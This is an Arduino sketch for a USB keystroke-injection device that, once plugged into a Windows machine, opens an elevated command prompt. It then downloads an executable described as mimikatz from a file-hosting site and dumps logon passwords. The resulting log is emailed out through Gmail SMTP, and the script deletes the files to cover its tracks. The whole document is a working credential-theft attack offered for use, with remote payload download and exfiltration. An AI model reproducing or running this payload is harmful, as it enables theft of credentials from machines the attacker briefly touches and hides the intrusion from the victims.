#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  Keyboard.begin();
  delay(500);
  Keyboard.press(KEY_LEFT_CTRL);
  delay(200);
  Keyboard.press(KEY_ESC);
  delay(200);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print("cmd.exe");
  delay(200);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.releaseAll();

  delay(1000);

  // Download the correct exe based on processor type
  Keyboard.print("powershell if ([System.IntPtr]::Size -eq 4) { (new-object System.Net.WebClient).DownloadFile('https://1fichier.com/?cw5v9jryul','%TEMP%\\pw.exe');  }else{ (new-object System.Net.WebClient).DownloadFile('https://1fichier.com/?13f1u3iqc3','%TEMP%\\pw.exe');}");
  typeKey(KEY_RETURN);
  delay(1500);

  // execute and export output from mimikatz
  Keyboard.print("%TEMP%\\pw.exe > C:\\pwlog.txt & type C:\\pwlog.txt;");
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print("privilege::debug");
  typeKey(KEY_RETURN);
  Keyboard.print("sekurlsa::logonPasswords full");
  typeKey(KEY_RETURN);
  Keyboard.print("exit");
  typeKey(KEY_RETURN);
  delay(300);
  Keyboard.print("del %TEMP%\\pw.exe");
  typeKey(KEY_RETURN);
  delay(300);

  // email log via gmail
  Keyboard.print("powershell -ExecutionPolicy ByPass");
  typeKey(KEY_RETURN);
  delay(300);
  Keyboard.print("$SMTPServer = 'smtp.gmail.com'");
  typeKey(KEY_RETURN);
  Keyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient($SMTPServer, 587)");
  typeKey(KEY_RETURN);
  Keyboard.print("$SMTPInfo.EnableSsl = $true");
  typeKey(KEY_RETURN);
  Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('EMAIL', 'PASSWORD');");
  typeKey(KEY_RETURN);
  Keyboard.print("$ReportEmail = New-Object System.Net.Mail.MailMessage");
  typeKey(KEY_RETURN);
  Keyboard.print("$ReportEmail.From = 'EMAIL'");
  typeKey(KEY_RETURN);
  Keyboard.print("$ReportEmail.To.Add('EMAIL')");
  typeKey(KEY_RETURN);
  Keyboard.print("$ReportEmail.Subject = 'Mimikatz report'");
  typeKey(KEY_RETURN);
  Keyboard.print("$ReportEmail.Body = 'script by Valkyrix.github.io'");
  typeKey(KEY_RETURN);
  Keyboard.print("$ReportEmail.Attachments.Add('C:\\pwlog.txt')");
  typeKey(KEY_RETURN);
  Keyboard.print("$SMTPInfo.Send($ReportEmail)");
  typeKey(KEY_RETURN);
  delay(7000);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // Cleanup and flee the scene.
  Keyboard.print("del C:\\pwlog.txt");
  typeKey(KEY_RETURN);
  delay(300);

  Keyboard.print("exit");
  typeKey(KEY_RETURN);
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
